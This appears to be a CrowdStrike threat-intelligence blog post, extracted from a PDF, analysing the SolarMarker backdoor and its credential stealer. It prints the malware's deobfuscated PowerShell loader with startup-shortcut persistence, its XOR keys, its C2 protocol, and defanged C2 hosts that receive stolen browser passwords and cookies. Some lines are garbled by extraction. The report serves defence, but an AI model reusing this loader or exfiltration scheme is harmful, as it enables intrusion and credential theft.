This blog details how the CrowdStrike Falcon Complete™ team detected the binary using the Falcon UI, our deobfuscation of the\ninitial stages, and how we collaborate with the CrowdStrike Intel team to conduct further analysis and protect our customers from emerging\nthreats.\n\n## Falcon Complete Triage\n\nOn Oct. 12, 2020, the Falcon Complete team began receiving detections for likely malicious PowerShell scripts affecting multiple customer\nenvironments. Falcon Prevent™ NGAV prevented the processes from running because the script displayed characteristics common to other\nknown malicious scripts.\n\n\n-----\n\nFigure 1. Falcon UI showing detection and prevention. (Click to enlarge)\n\nCommand lines associated with the detections were immediately flagged as suspicious because they were executing the contents of a\ntemporary file, then removing the file immediately after running.\n\nFigure 2. SolarMarker PowerShell command line\n\nExamination of this activity through Falcon’s Process Explorer tree raised additional red flags due source of the detection being files\ndownloaded via web browsers that were executable but masquerading as document files.\n\nFigure 3. Process Explorer showing SolarMarker process execution chain and prevention. (Click to enlarge)\n\nWhen reviewing the installer executable details\n\n\n-----\n\n_( S_ `56 3e99b59d` `9d ab9` `386e 09d9 35 9 66 0` `bcd` `dde85` `68` `5 d0` _),_\n\nit was observed that the files were signed by a seemingly unrelated certificate signer with a recent first-seen date.\n\nFigure 4. SolarMarker related certificate details\n\nResearching the installer executable in public malware repositories established that the file was first uploaded a few days beforehand.\nSuspicions were further raised by the large file size (114MB) along with the executable masquerading as a Microsoft Word document. These\nsuggested possible attempts to evade antivirus detection.\n\nFigure 5. SolarMarker installer executable icon\n\nThe installer also dropped legitimate binaries such as an application called “Docx2Rtf” (a known document converter) and a demo of “Expert\nPDF.” The Falcon Complete team concluded that the technique was used to convince victims that they had downloaded a corrupt document or\nrequired additional software to view the document.\n\n\n-----\n\nFigure 6. Docx2rtf Application\n\nFurther triage was performed using Falcon’s Real Time Response (RTR) mechanism to connect to an affected system and directly examine\nthe PowerShell file referenced in the detection command line. The script performed an XOR decryption of data contained in a second similarly\nnamed text file that, when decoded, contained another obfuscated PowerShell script.\n\nFigure 7. SolarMarker PowerShell obfuscation. (Click to enlarge)\n\nAlthough these processes were being blocked by the Falcon sensor, the Falcon Complete team decoded multiple levels of obfuscation and\nencryption and confirmed that the PowerShell script was malicious.\n\nThe analysis identified persistence mechanisms and a command and control (C2) IP address within the decrypted payload of the script. Using\nthese indicators of compromise (IOCs), the Falcon Complete team was able to verify that the malware was successfully blocked in all\ncustomer environments.\n\n\n-----\n\nFigure 8. Strings from SolarMarker payload\n\nThe investigation did not establish any clear link between targeted customers: The malware appeared across multiple different verticals, in\ndifferent regions and countries, and affected customers of various sizes. Initially, the infection vector appeared to be from phishing, but no\nstrong correlation with email client activity was observed, which usually occurs during phishing campaigns.\n\nIn the initial analysis, the Falcon Complete team could not link the malicious files to any known malware families or threat actor campaigns and\nengaged the CrowdStrike Intelligence team to investigate further.\n\n## CrowdStrike Intel Analysis\n\nBased on observed filenames in public malware repositories (e.g., `Advanced-Mathematical-Concepts-Precalculus-With-Applications-`\n```\nSolutions.exe ) and Falcon telemetry, the hypothesis is that the malware is delivered as a fake document download targeting users\n\n```\nperforming web searches for document files. CrowdStrike has observed a number of Google Sites hosted pages as lure sites for the malicious\ndownloads. These sites advertise document downloads and are often highly ranked in search results. The use of Google Sites suggests\nattempts by the threat actors to increase search ranking.\n\nThe malware installer filenames and lure sites have only been observed in English so far, and based on Falcon telemetry, it is clear that\nSolarMarker is most prevalent in Western countries, especially in the U.S.\n\nFigure 9. SolarMarker Infection Distribution\n\nThe executable with SHA256 hash\n\n\n-----\n\nis an Inno Setup Installer. This program is the first stage in a multi-stage dropper chain leading to the SolarMarker backdoor. Figure 10 gives\nan overview of the malware’s dropper chain.\n\nFigure 10. Overview of the SolarMarker Dropper Chain\n\nThe installer uses Inno Setup’s Pascal Scripting feature to customize its actions. It will first extract two temporary files to `%Tmp%\\`\n```\n<unique>.tmp\\<filename>, where <unique> is a unique directory name. The two files are the following:\n\n```\nFilename SHA256 hash\n\nDocx2Rtf.exe `caf8e546f8c6ce56009d28b96c4c8229561d10a6dd89d12be30fa9021b1ce2f4`\n\nwaste.dat `d730b47b0e8ce6c093fb492d2483a45f8bc93cac234a592d34c09945653daf4d`\n\nBoth files will be deleted once the installer completes. The file `Docx2Rtf.exe  is the document converter Docx2Rtf version 4.4, a benign file.`\nThe file `waste.dat is 112 MB in size, but contains only zero bytes, indicating that the file was only included in the installer to increase its`\nsize, which is known to prevent detection by some security products. Once these two files are extracted, `Docx2Rtf.exe is executed and the`\n\n\n-----\n\nsta e s eeps o e seco ds e t e sta e c ec s t s e ecuted o o e o ts ta geted ope at g syste (OS) e s o s a d e ts\nnot. The targeted versions are Windows 8.1, Windows Server 2012 R2, Windows 10 and Windows Server 2016. After being certain about the\nOS, the installer decrypts a third stage and writes it to `%Temp%\\<random>.txt, where` `<random> is a random 32-character hexadecimal`\nstring. The third stage is encrypted twice with different keys, and the installer will only decrypt it once. The decryption function named\n```\nDECRYPTPS takes in a hex-encoded-encrypted blob and a string-based key and performs a simple XOR operation. The function can be\n\n```\nreplicated in Python as follows:\n```\ndef decryptps(enc_payload,key):\n   enc_payload = unhexlify(enc_payload)\n   key = key.encode(\"utf-8\")\n   res=\"\"\n   for i in range(0,len(enc_payload)):\n     cur_enc_byte=enc_payload[i]\n     key_byte = key[i%len(key)]\n     decrypted_byte = cur_enc_byte ^ key_byte\n     res += chr(decrypted_byte)\n   return res\n\n```\nAfter saving the one-time-decrypted third stage, the installer writes a second-stage PowerShell script to `%Temp%\\<random>.txt and executes`\nit. This second stage contains the path to the previously written third stage.\n\n### Second Stage\n\nThe second stage’s sole purpose is decrypting the one-time-decrypted third stage written by the installer. All PowerShell scripts observed\nthroughout the dropper chain use the same decryption algorithm, which in Python looks as follows:\n```\ndef powershell_xor_decrypt(base64_encoded_payload,key):\n   encrypted_payload=base64.b64decode(base64_encoded_payload)\n   key=key.encode(\"utf-8\")\n   res=\"\"\n   for i in range(0,len(encrypted_payload)):\n     cur_enc_byte=encrypted_payload[i]\n     key_byte=key[i%len(key)]\n     decrypted_byte= cur_enc_byte ^ key_byte\n     res += chr(decrypted_byte)\n   return res\n\n```\nThe second stage will use the above algorithm to Base64-decode the one-time-decrypted third stage and XOR it with the following key:\n```\nZleyoPSJVRHxIWGgnjbYmKUOvfQTsqMXhCtpzkdirBELcaDNwuAF . The decrypted third stage is subsequently executed using InvokeExpression .\n\n### Third Stage\n\n```\nThe third stage drops a fourth stage to `%AppDaTa%\\Microsoft\\<RND4>\\<RND8>.cmd where` `<RND4> and` `<RND8> are four and eight`\nrandom characters, respectively.\n\nAdditionally, the third stage writes the Base64-decoded backdoor to `%AppDaTa%\\microsoft\\<RND4>\\<RND52> where` `<RND4> and`\n```\n<RND52> are four and 52 random characters, respectively. This Base64-decoded backdoor has the following SHA256 hash:\n45ea9b5697517f7bdc5af83c62bb8de7821baef9463c466cfc0e881f21c32011\n\n```\n\nFurthermore, the third stage modifies shortcuts (.LNK files) on the desktop of the current user and .LNK files that are shared by all users on\ntheir desktop. The third stage will alter some, but not all shortcuts to also execute a third stage, which is discussed below. A shortcut is\nchanged only if its target path points to an existing file that has a file extension. Additionally, the shortcut is only modified when this target path\ndoes not contain the substring `cmd.exe . Also, shortcuts with arguments are not altered. All other shortcuts are modified to execute their`\noriginal target using `cmd.exe but additionally run a fourth stage. Once the shortcuts have been modified, the third stage executes the fourth`\nstage directly.\n\n### Fourth Stage\n\nThe following is a deobfuscated version of the fourth stage:\n\n\n-----\n\n```\nIf(-not(test-path $path_to_persist)){\n   $wscript_shell=new-object -comobject wscript.shell;\n   $shortcut=$wscript_shell.createshortcut($path_to_persist);\n   $shortcut.windowstyle=7;\n   $shortcut.targetpath=<path to fourth stage>;\n   $shortcut.save();\n};\nIf((get-process -name '*powershell*').count -lt 15){\n$xor_key=\"XlA7P25AfkVNcUBzKnJgXk5FbXk+VmNsfHdXcVo0dlkpIX5vVXh3cHVlK2h+aGxSTkZ3MjdWYXB8NkFVdCtCNTFvVHNQb3pPU00ycUA5YGF1OX5+XnBgZmVzcW\n$decrypted_backdoor[system.io.file]::readallbytes([system.text.encoding]::utf8.getstring([system.convert]::frombase64string('QzpcVXN\n   For($i=0;$i -lt $decrypted_backdoor.count;){\n     For($j=0;$j -lt $xor_key.length;$j++){\n        $decrypted_backdoor[$i]=$decrypted_backdoor[$i] -bxor $xor_key[$j];\n        $i++;\n        If($i -ge $decrypted_backdoor.count){\n          $j=$xor_key.length\n        }\n     }\n   };\n   [system.reflection.assembly]::load($decrypted_backdoor);\n   [d.m]::run()\n}\n\n```\nThis script establishes persistence by creating a shortcut under the following path:\n```\n%AppData%\\microsoft\\windows\\startmenu\\programs\\startup\\a7f9214c3844f0a883268d3853ba7.lnk\n\n```\n\nThis shortcut then points to the fourth stage itself. Once persistence has been established, the fourth stage then Base64-decodes a path to the\nBase64-decoded backdoor. Recall that the Base64-decoded backdoor had been written to `%AppDaTa%\\microsoft\\<RND4>\\<RND52> by the`\nthird stage. In the presented fourth stage sample, this Base64-encoded path is:\n```\nQzpcVXNlcnNcZXhhbXBsZV91c2VyXEFwcERhdGFcUm9hbWluZ1xNSUNyb1NPZlRcU1lIclxPRnJTR1ZkVFdheGttS0llQW5Vb1p3Y0N5dmlzYlFOcVJ6dXB\n\n```\n\nwhich decodes to the following path:\n```\nC:\\Users\\example_user\\AppData\\Roaming\\MICroSOfT\\SYHr\\OFrSGVdTWaxkmKIeAnUoZwcCyvisbQNqRzupJEhPgMjtXfDLlHYB\n\n```\n\nThe file referenced by this path is read and then XORed with the following key:\n```\nXlA7P25AfkVNcUBzKnJgXk5FbXk+VmNsfHdXcVo0dlkpIX5vVXh3cHVlK2h+aGxSTkZ3MjdWYXB8NkFVdCtCNTFvVHNQb3pPU00ycUA5YGF1OX5+XnBgZmV\n\n```\nThe result of this decryption is a .NET executable with the following SHA256 hash:\n```\nceb42fea3be898251028e2c5128a69451212bcb48a4871454c60dc2262426677\n\n```\n\nFinally, the fourth stage loads the executable as .NET assembly and calls the `D::M.Run method.`\n\n### Backdoor\n\nThis Run function is the entry point of the SolarMarker backdoor (alias C2 Jupyter client). Initially, the backdoor generates a 32-byte random\nstring as a victim ID and saves it under `%AppData%\\AppData\\Roaming\\solarmarker.dat . Additionally, the malware collects information`\nabout the computer and sends an initial request to its C2 server at `http[:]//45.135.232[.]131 . Communication between the backdoor`\nand its C2 servers is facilitated via a JSON-like protocol where each message is encrypted using the following hardcoded XOR key:\n```\n4qMpLcYfVM4eimGl4Qz7cxPiafbL9edWpM1O\n\n```\n\nOnce encrypted, messages are Base64-encoded and sent via a POST request to the C2 server. The initial message contains the following\ninformation:\n\nKey Description\n\n\n-----\n\n`rights` Rights of the executing user\n\n`workgroup` Workgroup of the PC\n\n`version` Version of the backdoor. In the analyzed sample, this has value `DR/1.0 .`\n\n`protocol_version` Likely version of the C2 communication protocol. In the analyzed sample, this value is `1 .`\n\nThe C2 server then responds to this message using a task that is either of type `status=command,` `status=file, or` `status=idle .`\n\nTasks of type `idle contain nothing else but the status field.`\n\nTask for `command type:`\n\nKey Description\n\n`status` Type of command from C2\n\n`command` Commands to execute using PowerShell\n\nTask for `file :`\n\nKey Description\n\n`status` Type of command from C2\n\n`task_id` Task ID likely used to reidentify a started task\n\n`type` Type of file to be executed. This can either be the file extension `exe or` `ps1 .`\n\nTasks of `command type are directly executed via PowerShell and the backdoor waits 30 seconds before sending another initial message to`\nrequest a new task.\n\nFor `file tasks, the client requests the file to execute using the following message:`\n\nKey Description\n\n`action` The request type to retrieve a file is `get_file .`\n\n`hwid` Unique identifier for victim PC\n\n`task_id` Task ID from the task which requested a file to be executed\n\n`protocol_version` Version of the C2 communication protocol. In this sample, the version is `1 .`\n\nThe C2 then answers with a payload that is saved under `%Temp%\\<RND24>.<exe/ps1> with the respective extension, where` `<RND24> are`\n24 random characters. Next the payload is executed. After 30 seconds, the backdoor sends the following message to the C2:\n\nKey Description\n\n`action` The request type to report the execution of a file is `change_status .`\n\n`hwid` Unique identifier for victim PC\n\n`task_id` Task ID from the task that requested a file to be executed\n\n`is_success` Always set to `true . Independent of the exit code of the executed payload.`\n\n`protocol_version` Version of the C2 communication protocol. In the observed sample, the version is `1 .`\n\nThe C2 is expected to respond with a new task to this message.\n\n### Credential Harvester\n\nOn Oct. 15, 2020, CrowdStrike Intelligence observed the backdoor distributing a credential harvester. CrowdStrike Intelligence dubbed this\nmalware SolarMarker Stealer (aka Jupyter Stealer). The stealer’s first stage is a PowerShell script with the following SHA256 hash:\n```\n2a8bc51367801c87ca2c64fdad1d0b06f91bbbc4f0f16ad18dbc122fda3d1a87\n\n```\n\nThis PowerShell script contains a Base64-encoded payload with the following SHA256 hash:\n```\n73dcbbf322b72e2cf675ca3356a7ece34e24108a82ad36eeb98596a35c8fdb16\n\n```\n\n-----\n\ns pay oad s ase6 decoded a d t e O ed us g t e o o g ey\n```\nQH5WcmheMHRucV5TSDZUQHYpKG1eb29WQl5TITtHQHF2d3peMEE0NEBScGFiXlNgYURAc3pac0B7Tj9lXjFoRkBeb293S0B1ckJIXjBKSjleTXxnYV4wYj9\n\n```\nThe resulting payload with SHA256 hash\n```\nce486097ad2491aba8b1c120f6d0aa23eaf59cf698b57d2113faab696d03c601\n\n```\n\nis a .NET based credential harvester configured for the C2 server `https[:]//vincentolife[.]com/j . The malware is capable of stealing`\npasswords, cookies and form auto-completion data from Google Chrome and Mozilla Firefox. Additionally, the stealer extracts the certificate\nand key databases from Firefox. The stolen data is sent to the C2 at `https[:]//vincentolife[.]com/j/post?q= using a POST request,`\nwhere the GET parameter q is a JSON array containing the following information about the victim PC:\n\nKey Description\n\n`hwid` Uniquely identifies victim PC using a randomly generated string of length 32. Saved in\n```\n     %userprofile%\\AppData\\Roaming\\solarmarker.dat\n\n```\n`pn` Machine name of the PC\n\n`os` Operating system version including service pack\n\n`x` CPU architecture\n\n`prm` Rights of the executing user\n\n`ver` Likely version of the stealer. In the analyzed sample, this has value `CSDN/1.8`\n\nFurther, SolarMarker Stealer is capable of decrypting data for the current user that has been encrypted using Microsoft’s Data Protection API.\n\n## Indicators of Compromise\n\n### Files\n\nDescription Path if applicable SHA256 hash if applicable\n\nSecond `%Temp%\\<random chars>.txt` Changes due to randomly generated path to third stage it contains\nstage\n\nEncrypted `%Temp%\\<random chars>.txt` `e82a58e59321852c6857aa511472cbb7327822461a03e3c189304b2c36`\nthird stage\n\nThird stage None `2860a7b98dbfc4c10347187e79d7528a875dd71a893ce025190b57bcb1`\n\nFourth `%AppData%\\microsoft\\<RND4>\\<RND8>.cmd` Changes due to randomly generated paths it contains\nstage\n\nEncrypted None `b3e6a879d4ac3fff34b520f39994639df26e846087632fb7505e89a4da`\nbackdoor\n\nBase64- `%AppData%\\microsoft\\<RND4>\\<RND52>` `45ea9b5697517f7bdc5af83c62bb8de7821baef9463c466cfc0e881f21`\ndecoded\nbackdoor\n\nBackdoor None `ceb42fea3be898251028e2c5128a69451212bcb48a4871454c60dc2262`\n\nSolarMarker `%Temp%\\<RND24>.ps1` `2a8bc51367801c87ca2c64fdad1d0b06f91bbbc4f0f16ad18dbc122fda`\nStealer first\nstage\n\nSolarMarker None `ce486097ad2491aba8b1c120f6d0aa23eaf59cf698b57d2113faab696d`\nStealer\n\nVictim ID `%userprofile%\\AppData\\Roaming\\solarmarker.dat` Changes due to randomly generated content\n\n### Network\n\nDescription C2\n\n\n-----\n\n**e So a** **a** **e bac doo** **as o g** **a y** **a** **ed** **pub c epo t** **g** **Octobe** **0 0 a d s** **ot** **a y** **ay e ated to t e ece t** **g**\n**profile SUNBURST/SUNSPOT intrusion activity.**\n\n**Additional Resources**\n\n_[Learn how any size organization can achieve optimal security with Falcon Complete by visiting the product webpage.](https://www.crowdstrike.com/endpoint-security-products/falcon-complete/)_\n_[Learn about CrowdStrike’s comprehensive next-gen endpoint protection platform by visiting the Falcon products webpage.](https://www.crowdstrike.com/endpoint-security-products/)_\n_Test CrowdStrike next-gen AV for yourself:_ _[Start your free trial of Falcon Prevent.](https://go.crowdstrike.com/try-falcon-prevent.html)_\n\n\n-----",
